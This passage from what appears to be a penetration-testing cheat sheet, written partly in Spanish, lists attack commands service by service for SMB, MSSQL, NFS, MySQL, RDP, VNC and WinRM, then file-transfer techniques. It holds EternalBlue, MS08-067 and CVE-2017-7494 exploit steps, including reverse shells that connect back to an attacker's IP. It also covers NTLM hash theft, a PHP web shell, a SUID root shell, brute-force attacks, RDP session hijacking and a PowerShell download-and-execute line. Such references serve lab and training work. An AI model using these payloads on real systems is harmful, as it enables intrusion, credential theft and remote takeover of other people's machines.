</pre></td> --><td class="rouge-code"><pre>Sometimes nmap doesn‚Äôt show the version of Samba in the remote host, if this happens, a good way to know which version the remote host is running, is to capture traffic with wireshark against the remote host on 445/139 and in parallel run an smbclient -L, do a follow tcp stream and with this we might see which version the server is running.

OR

sudo ngrep -i -d &lt;INTERFACE&gt; 's.?a.?m.?b.?a.*[[:digit:]]' port 139
smbclient -L &lt;IP&gt;
</pre></td></tr></tbody></table></code></pre></div></div>

<h4 id="scan-for-vulnerability">Scan for vulnerability</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
</pre></td> --><td class="rouge-code"><pre>nmap -p139,445 --script "smb-vuln-* and not(smb-vuln-regsvc-dos)" --script-args smb-vuln-cve-2017-7494.check-version,unsafe=1 &lt;IP&gt;
</pre></td></tr></tbody></table></code></pre></div></div>

<p>If :</p>

<ul>
  <li>MS17-010 - <a href="#EternalBlue (MS17-010)">EternalBlue</a></li>
  <li>MS08-067 - <a href="#MS08-067">MS08-067</a></li>
  <li>CVE-2017-7494 - <a href="#CVE-2017-7494">CVE-2017-7494</a></li>
</ul>

<h4 id="manual-testing">Manual testing</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre></td> --><td class="rouge-code"><pre>smbmap -H &lt;IP&gt;
smbmap -u '' -p '' -H &lt;IP&gt;
smbmap -u 'guest' -p '' -H &lt;IP&gt;
smbmap -u '' -p '' -H &lt;IP&gt; -R

crackmapexec smb &lt;IP&gt;
crackmapexec smb &lt;IP&gt; -u '' -p ''
crackmapexec smb &lt;IP&gt; -u 'guest' -p ''
crackmapexec smb &lt;IP&gt; -u '' -p '' --shares

enum4linux -a &lt;IP&gt;

smbclient --no-pass -L //$IP
smbclient //&lt;IP&gt;/&lt;SHARE&gt;

# Download all files from a directory recursively
smbclient //&lt;IP&gt;/&lt;SHARE&gt; -U &lt;USER&gt; -c "prompt OFF;recurse ON;mget *"
</pre></td></tr></tbody></table></code></pre></div></div>

<h4 id="brute-force">Brute force</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td> --><td class="rouge-code"><pre>crackmapexec smb &lt;IP&gt; -u &lt;USERS_LIST&gt; -p &lt;PASSWORDS_LIST&gt;
hydra -V -f -L &lt;USERS_LIST&gt; -P &lt;PASSWORDS_LIST&gt; smb://&lt;IP&gt; -u -vV
</pre></td></tr></tbody></table></code></pre></div></div>

<h4 id="mount-a-smb-share">Mount a SMB share</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td> --><td class="rouge-code"><pre>mkdir /tmp/share
sudo mount -t cifs //&lt;IP&gt;/&lt;SHARE&gt; /tmp/share
sudo mount -t cifs -o 'username=&lt;USER&gt;,password=&lt;PASSWORD&gt;'//&lt;IP&gt;/&lt;SHARE&gt; /tmp/share

smbclient //&lt;IP&gt;/&lt;SHARE&gt;
smbclient //&lt;IP&gt;/&lt;SHARE&gt; -U &lt;USER&gt;
</pre></td></tr></tbody></table></code></pre></div></div>

<h4 id="get-a-shell">Get a shell</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre></td> --><td class="rouge-code"><pre>psexec.py &lt;DOMAIN&gt;/&lt;USER&gt;:&lt;PASSWORD&gt;@&lt;IP&gt;
psexec.py &lt;DOMAIN&gt;/&lt;USER&gt;@&lt;IP&gt; -hashes :&lt;NTHASH&gt;

wmiexec.py &lt;DOMAIN&gt;/&lt;USER&gt;:&lt;PASSWORD&gt;@&lt;IP&gt;
wmiexec.py &lt;DOMAIN&gt;/&lt;USER&gt;@&lt;IP&gt; -hashes :&lt;NTHASH&gt;

smbexec.py &lt;DOMAIN&gt;/&lt;USER&gt;:&lt;PASSWORD&gt;@&lt;IP&gt;
smbexec.py &lt;DOMAIN&gt;/&lt;USER&gt;@&lt;IP&gt; -hashes :&lt;NTHASH&gt;

atexec.py &lt;DOMAIN&gt;/&lt;USER&gt;:&lt;PASSWORD&gt;@&lt;IP&gt; &lt;COMMAND&gt;
atexec.py &lt;DOMAIN&gt;/&lt;USER&gt;@&lt;IP&gt; -hashes :&lt;NTHASH&gt;
</pre></td></tr></tbody></table></code></pre></div></div>

<h4 id="eternalblue-ms17-010">EternalBlue (MS17-010)</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
</pre></td> --><td class="rouge-code"><pre>https://github.com/3ndG4me/AutoBlue-MS17-010
</pre></td></tr></tbody></table></code></pre></div></div>

<h5 id="check-if-vulnerable">Check if vulnerable</h5>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
</pre></td> --><td class="rouge-code"><pre>python eternal_checker.py &lt;IP&gt;
</pre></td></tr></tbody></table></code></pre></div></div>

<h5 id="prepare-shellcodes-and-listeners">Prepare shellcodes and listeners</h5>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td> --><td class="rouge-code"><pre>cd shellcode
./shell_prep.sh
cd ..
./listener_prep.sh
</pre></td></tr></tbody></table></code></pre></div></div>

<h5 id="exploit">Exploit</h5>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td> --><td class="rouge-code"><pre>python eternalblue_exploit&lt;NUMBER&gt;.py &lt;IP&gt; shellcode/sc_all.bin

May need to run it multiple times
</pre></td></tr></tbody></table></code></pre></div></div>

<h5 id="if-this-doesnt-work-try-this-one">If this doesn‚Äôt work, try this one</h5>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
</pre></td> --><td class="rouge-code"><pre>python zzz_exploit.py &lt;IP&gt;
</pre></td></tr></tbody></table></code></pre></div></div>

<h4 id="ms08-067">MS08-067</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre></td> --><td class="rouge-code"><pre># Download exploit code
git clone https://github.com/andyacer/ms08_067.git

# Generate payload
msfvenom -p windows/shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows
msfvenom -p windows/shell_bind_tcp RHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows

# Modify
Modify ms08_067_2018.py and replace the shellcode variable by the one generated with msfvenom.

# Listener
nc -lvp &lt;PORT&gt;

# Exploit
python ms08_067_2018.py &lt;IP&gt; &lt;NUMBER&gt; 445
</pre></td></tr></tbody></table></code></pre></div></div>

<h4 id="cve-2017-7494">CVE-2017-7494</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td> --><td class="rouge-code"><pre># Download exploit code
git clone https://github.com/joxeankoret/CVE-2017-7494
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Create a new file named poc.c :</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre></td> --><td class="rouge-code"><pre>#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

int samba_init_module(void)
{
	setresuid(0,0,0);
	system("ping -c 3 &lt;IP&gt;");
}
</pre></td></tr></tbody></table></code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td> --><td class="rouge-code"><pre># Build
gcc -o test.so -shared poc.c -fPIC
</pre></td></tr></tbody></table></code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td> --><td class="rouge-code"><pre># Start an ICMP listener
sudo tcpdump -i &lt;INTERFACE&gt; icmp

# Exploit
./cve_2017_7494.py -t &lt;TARGET_IP&gt; -u &lt;USER&gt; -P &lt;PASSWORD&gt; --custom=test.so
</pre></td></tr></tbody></table></code></pre></div></div>

<p>If you reiceve 3 pings on your listener then the exploit works. Now let‚Äôs get a shell :</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre></td> --><td class="rouge-code"><pre>#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

int samba_init_module(void)
{
	setresuid(0,0,0);
	system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc &lt;IP&gt; &lt;PORT&gt; &gt;/tmp/f");
}
</pre></td></tr></tbody></table></code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td> --><td class="rouge-code"><pre># Build
gcc -o test.so -shared poc.c -fPIC
</pre></td></tr></tbody></table></code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td> --><td class="rouge-code"><pre># Start a listener
nc -lvp &lt;PORT&gt;

# Exploit
./cve_2017_7494.py -t &lt;TARGET_IP&gt; -u &lt;USER&gt; -P &lt;PASSWORD&gt; --custom=test.so
</pre></td></tr></tbody></table></code></pre></div></div>

<hr />

<h3 id="mssql---1433">MSSQL -&gt; 1433</h3>

<h4 id="get-information">Get information</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
</pre></td> --><td class="rouge-code"><pre>nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 &lt;IP&gt;
</pre></td></tr></tbody></table></code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre></td> --><td class="rouge-code"><pre>mssqlclient.py -windows-auth &lt;DOMAIN&gt;/&lt;USER&gt;:&lt;PASSWORD&gt;@&lt;IP&gt;
mssqlclient.py &lt;USER&gt;:&lt;PASSWORD&gt;@&lt;IP&gt;

# Once logged in you can run queries:
SQL&gt; select @@ version;

# Steal NTLM hash
sudo smbserver.py -smb2support liodeus .
SQL&gt; exec master..xp_dirtree '\\&lt;IP&gt;\liodeus\' # Steal the NTLM hash, crack it with john or hashcat

# Try to enable code execution
SQL&gt; enable_xp_cmdshell

# Execute code
SQL&gt; xp_cmdshell whoami /all
SQL&gt; xp_cmdshell certutil.exe -urlcache -split -f http://&lt;IP&gt;/nc.exe
</pre></td></tr></tbody></table></code></pre></div></div>

<h4 id="manual-exploit">Manual exploit</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td> --><td class="rouge-code"><pre>Cheatsheet :
	- https://www.asafety.fr/mssql-injection-cheat-sheet/
</pre></td></tr></tbody></table></code></pre></div></div>

<hr />

<h3 id="nfs---2049">NFS -&gt; 2049</h3>

<p>Tambien podemos consultar en hacktricks</p>

<h4 id="show-mountable-nfs-shares">Show Mountable NFS Shares</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td> --><td class="rouge-code"><pre>showmount -e &lt;IP&gt;
nmap --script=nfs-showmount -oN mountable_shares &lt;IP&gt;
</pre></td></tr></tbody></table></code></pre></div></div>

<h4 id="mount-a-share">Mount a share</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td> --><td class="rouge-code"><pre>sudo mount -v -t nfs &lt;IP&gt;:&lt;SHARE&gt; &lt;DIRECTORY&gt;
sudo mount -v -t nfs -o vers=2 &lt;IP&gt;:&lt;SHARE&gt; &lt;DIRECTORY&gt;
</pre></td></tr></tbody></table></code></pre></div></div>

<h4 id="nfs-misconfigurations">NFS misconfigurations</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td> --><td class="rouge-code"><pre># List exported shares
cat /etc/exports
</pre></td></tr></tbody></table></code></pre></div></div>

<p>If you find some directory that is configured as no_root_squash/no_all_squash you may be able to privesc.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre></td> --><td class="rouge-code"><pre># Attacker, as root user

mkdir &lt;DIRECTORY&gt;
mount -v -t nfs &lt;IP&gt;:&lt;SHARE&gt; &lt;DIRECTORY&gt;
cd &lt;DIRECTORY&gt;
echo 'int main(void){setreuid(0,0); system("/bin/bash"); return 0;}' &gt; pwn.c
gcc pwn.c -o pwn
chmod +s pwn

# Victim

cd &lt;SHARE&gt;
./pwn # Root shell
</pre></td></tr></tbody></table></code></pre></div></div>

<hr />

<h3 id="mysql---3306">MYSQL -&gt; 3306</h3>

<h4 id="fuerza-bruta-5">Fuerza bruta</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
</pre></td> --><td class="rouge-code"><pre>hydra -L &lt;USERS_LIST&gt; -P &lt;PASSWORDS_LIST&gt; &lt;IP&gt; mysql -vV -I -u
</pre></td></tr></tbody></table></code></pre></div></div>

<h4 id="extracting-mysql-credentials-from-files">Extracting MySQL credentials from files</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td> --><td class="rouge-code"><pre>cat /etc/mysql/debian.cnf
grep -oaE "[-_\.\*a-Z0-9]{3,}" /var/lib/mysql/mysql/user.MYD | grep -v "mysql_native_password"
</pre></td></tr></tbody></table></code></pre></div></div>

<h4 id="conectarte">Conectarte</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td> --><td class="rouge-code"><pre># Local
mysql -u &lt;USER&gt;
mysql -u &lt;USER&gt; -p

# Remote
mysql -h &lt;IP&gt; -u &lt;USER&gt;
</pre></td></tr></tbody></table></code></pre></div></div>

<h4 id="mysql-comandos">MySQL comandos</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre></td> --><td class="rouge-code"><pre>show databases;
use &lt;DATABASES&gt;;

show tables;
describe &lt;TABLE&gt;;

select * from &lt;TABLE&gt;;

# Try to execute code
select do_system('id');
\! sh

# Read &amp; Write
select load_file('&lt;FILE&gt;');
select 1,2,"&lt;?php echo shell_exec($_GET['c']);?&gt;",4 into OUTFILE '&lt;OUT_FILE&gt;'
</pre></td></tr></tbody></table></code></pre></div></div>

<h4 id="manual-exploit-1">Manual exploit</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td> --><td class="rouge-code"><pre>Cheatsheet :
	- https://www.asafety.fr/mysql-injection-cheat-sheet/
</pre></td></tr></tbody></table></code></pre></div></div>

<hr />

<h3 id="rdp---3389">RDP -&gt; 3389</h3>

<h4 id="fuerza-bruta-6">Fuerza bruta</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td> --><td class="rouge-code"><pre>crowbar -b rdp -s &lt;IP&gt;/CIDR -u &lt;USER&gt; -C &lt;PASSWORDS_LIST&gt;
crowbar -b rdp -s &lt;IP&gt;/CIDR -U &lt;USERS_LIST&gt; -C &lt;PASSWORDS_LIST&gt;

hydra -f -L &lt;USERS_LIST&gt; -P &lt;PASSWORDS_LIST&gt; rdp://&lt;IP&gt; -u -vV
</pre></td></tr></tbody></table></code></pre></div></div>

<h4 id="conectarte-con-contrase√±a-o-hashes">Conectarte con contrase√±a o hashes</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td> --><td class="rouge-code"><pre>rdesktop -u &lt;USERNAME&gt; &lt;IP&gt;
rdesktop -d &lt;DOMAIN&gt; -u &lt;USERNAME&gt; -p &lt;PASSWORD&gt; &lt;IP&gt;

xfreerdp /u:[DOMAIN\]&lt;USERNAME&gt; /p:&lt;PASSWORD&gt; /v:&lt;IP&gt;
xfreerdp /u:[DOMAIN\]&lt;USERNAME&gt; /pth:&lt;HASH&gt; /v:&lt;IP&gt;
</pre></td></tr></tbody></table></code></pre></div></div>

<h4 id="session-stealing">Session stealing</h4>

<h5 id="get-openned-sessions">Get openned sessions</h5>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
</pre></td> --><td class="rouge-code"><pre>query user
</pre></td></tr></tbody></table></code></pre></div></div>

<h5 id="access-to-the-selected">Access to the selected</h5>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
</pre></td> --><td class="rouge-code"><pre>tscon &lt;ID&gt; /dest:&lt;SESSIONNAME&gt;
</pre></td></tr></tbody></table></code></pre></div></div>

<h4 id="adding-user-to-rdp-group-windows">Adding user to RDP group (Windows)</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
</pre></td> --><td class="rouge-code"><pre>net localgroup "Remote Desktop Users" &lt;USER&gt; /add
</pre></td></tr></tbody></table></code></pre></div></div>

<hr />

<h3 id="vnc----5800-58001-5900-59001">VNC  -&gt; 5800, 58001, 5900, 59001</h3>

<h4 id="escaneo">Escaneo</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
</pre></td> --><td class="rouge-code"><pre>nmap -sV --script vnc-info,realvnc-auth-bypass,vnc-title -v -p &lt;PORT&gt; &lt;IP&gt;
</pre></td></tr></tbody></table></code></pre></div></div>

<h4 id="fuerza-bruta-7">Fuerza bruta</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
</pre></td> --><td class="rouge-code"><pre>hydra -L &lt;USERS_LIST&gt; ‚ÄìP &lt;PASSWORDS_LIST&gt; -s &lt;PORT&gt; &lt;IP&gt; vnc -u -vV
</pre></td></tr></tbody></table></code></pre></div></div>

<h4 id="conectarte-1">Conectarte</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
</pre></td> --><td class="rouge-code"><pre>vncviewer &lt;IP&gt;:&lt;PORT&gt;
</pre></td></tr></tbody></table></code></pre></div></div>

<h4 id="found-vnc-password">Found VNC password</h4>

<h5 id="linux">Linux</h5>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
</pre></td> --><td class="rouge-code"><pre>Default password is stored in: ~/.vnc/passwd
</pre></td></tr></tbody></table></code></pre></div></div>

<h5 id="windows">Windows</h5>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre></td> --><td class="rouge-code"><pre># RealVNC
HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\vncserver

# TightVNC
HKEY_CURRENT_USER\Software\TightVNC\Server

# TigerVNC
HKEY_LOCAL_USER\Software\TigerVNC\WinVNC4

# UltraVNC
C:\Program Files\UltraVNC\ultravnc.ini
</pre></td></tr></tbody></table></code></pre></div></div>

<h4 id="decrypt-vnc-password">Decrypt VNC password</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td> --><td class="rouge-code"><pre>msfconsole
irb
fixedkey = "\x17\x52\x6b\x06\x23\x4e\x58\x07"
require 'rex/proto/rfb'
Rex::Proto::RFB::Cipher.decrypt ["2151D3722874AD0C"].pack('H*'), fixedkey
/dev/nul
</pre></td></tr></tbody></table></code></pre></div></div>

<hr />

<h3 id="winrm---5985-5986">WINRM -&gt; 5985, 5986</h3>

<h4 id="fuerza-bruta-8">Fuerza bruta</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
</pre></td> --><td class="rouge-code"><pre>crackmapexec winrm &lt;IP&gt; -u &lt;USERS_LIST&gt; -p &lt;PASSWORDS_LIST&gt;
</pre></td></tr></tbody></table></code></pre></div></div>

<h4 id="conectarte-2">Conectarte</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td> --><td class="rouge-code"><pre>evil-winrm -i &lt;IP&gt; -u &lt;USER&gt; -p &lt;PASSWORD&gt;
evil-winrm -i &lt;IP&gt; -u &lt;USER&gt; -H &lt;HASH&gt;
</pre></td></tr></tbody></table></code></pre></div></div>

<hr />

<h2 id="tansferencia-de-archivos">Tansferencia de archivos</h2>

<h3 id="linux-1">Linux</h3>

<p>Estas son distintas formas de transferir archivos entre maquinas linux</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
</pre></td> --><td class="rouge-code"><pre><span class="c"># INICIANDO UN SERVIDOR WEB CON PYTHON</span>
<span class="nb">sudo </span>python <span class="nt">-m</span> SimpleHTTPServer &lt;PORT&gt; <span class="c"># Opci√≥n 1</span>
<span class="nb">sudo </span>python <span class="nt">-m</span> http.server &lt;PORT&gt; <span class="c"># Opci√≥n 2</span>

<span class="c"># FTP</span>
<span class="nb">sudo </span>python3 <span class="nt">-m</span> pyftpdlib  <span class="nt">-p</span> 21 <span class="nt">-w</span>

<span class="c"># INICIANDO UN SERVIDOR SMB</span>
<span class="nb">sudo </span>impacket-smbserver smbFolder <span class="si">$(</span><span class="nb">pwd</span><span class="si">)</span> <span class="nt">-smb2support</span>

<span class="c"># WGET</span>
wget &lt;URL&gt; <span class="nt">-o</span> &lt;OUT_FILE&gt;

<span class="c"># CURL</span>
curl &lt;URL&gt; <span class="nt">-o</span> &lt;OUT_FILE&gt;

<span class="c"># NETCAT</span>
nc <span class="nt">-lvp</span> 443 <span class="o">&gt;</span> &lt;OUT_FILE&gt; <span class="c"># Victima</span>
nc &lt;IP&gt; 443 &lt; &lt;IN_FILE&gt;  <span class="c"># Atacante</span>

<span class="c"># SCP</span>
scp &lt;SOURCE_FILE&gt; &lt;USER&gt;@&lt;IP&gt;:&lt;DESTINATION_FILE&gt;
scp <span class="nt">-P</span> 2222 <span class="nt">-i</span> id_rsa pspy www-data@10.10.10.246:/tmp/pspy <span class="c"># Ejemplo</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<hr />

<h3 id="windows-1">Windows</h3>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
</pre></td> --><td class="rouge-code"><pre><span class="c"># FTP </span><span class="w">
</span><span class="n">echo</span><span class="w"> </span><span class="nx">open</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">IP</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">21</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">ftp.txt</span><span class="w"> </span><span class="nx">echo</span><span class="w"> </span><span class="nx">anonymous</span><span class="err">&gt;&gt;</span><span class="w"> </span><span class="nx">ftp.txt</span><span class="w"> </span><span class="nx">echo</span><span class="w"> </span><span class="nx">password</span><span class="err">&gt;&gt;</span><span class="w"> </span><span class="nx">ftp.txt</span><span class="w"> </span><span class="nx">echo</span><span class="w"> </span><span class="nx">binary</span><span class="err">&gt;&gt;</span><span class="w"> </span><span class="nx">ftp.txt</span><span class="w"> </span><span class="nx">echo</span><span class="w"> </span><span class="nx">GET</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">FILE</span><span class="err">&gt;</span><span class="w"> </span><span class="err">&gt;&gt;</span><span class="w"> </span><span class="nx">ftp.txt</span><span class="w"> </span><span class="nx">echo</span><span class="w"> </span><span class="nx">bye</span><span class="err">&gt;&gt;</span><span class="w"> </span><span class="nx">ftp.txt</span><span class="w">
</span><span class="n">ftp</span><span class="w"> </span><span class="nt">-v</span><span class="w"> </span><span class="nt">-n</span><span class="w"> </span><span class="nt">-s</span><span class="p">:</span><span class="nx">ftp.txt</span><span class="w">

</span><span class="c"># SMB</span><span class="w">
</span><span class="n">copy</span><span class="w"> </span><span class="nx">\\</span><span class="err">&lt;</span><span class="nx">IP</span><span class="err">&gt;</span><span class="nx">\</span><span class="err">&lt;</span><span class="nx">PATH</span><span class="err">&gt;</span><span class="nx">\</span><span class="err">&lt;</span><span class="nx">FILE</span><span class="err">&gt;</span><span class="w"> </span><span class="c"># Linux -&gt; Windows</span><span class="w">
</span><span class="n">copy</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">FILE</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">\\</span><span class="err">&lt;</span><span class="nx">IP</span><span class="err">&gt;</span><span class="nx">\</span><span class="err">&lt;</span><span class="nx">PATH</span><span class="err">&gt;</span><span class="nx">\</span><span class="w"> </span><span class="c"># Windows -&gt; Linux</span><span class="w">

</span><span class="c"># Powershell</span><span class="w">
</span><span class="n">powershell.exe</span><span class="w"> </span><span class="p">(</span><span class="n">New-Object</span><span class="w"> </span><span class="nx">System.Net.WebClient</span><span class="p">)</span><span class="o">.</span><span class="nf">DownloadFile</span><span class="p">(</span><span class="s1">'&lt;URL&gt;'</span><span class="p">,</span><span class="w"> </span><span class="s1">'&lt;DESTINATION_FILE&gt;'</span><span class="p">)</span><span class="w">
</span><span class="n">powershell.exe</span><span class="w"> </span><span class="nx">IEX</span><span class="w"> </span><span class="p">(</span><span class="n">New-Object</span><span class="w"> </span><span class="nx">System.Net.WebClient</span><span class="p">)</span><span class="o">.</span><span class="nf">DownloadString</span><span class="p">(</span><span class="s1">'&lt;URL&gt;'</span><span class="p">)</span><span class="w">
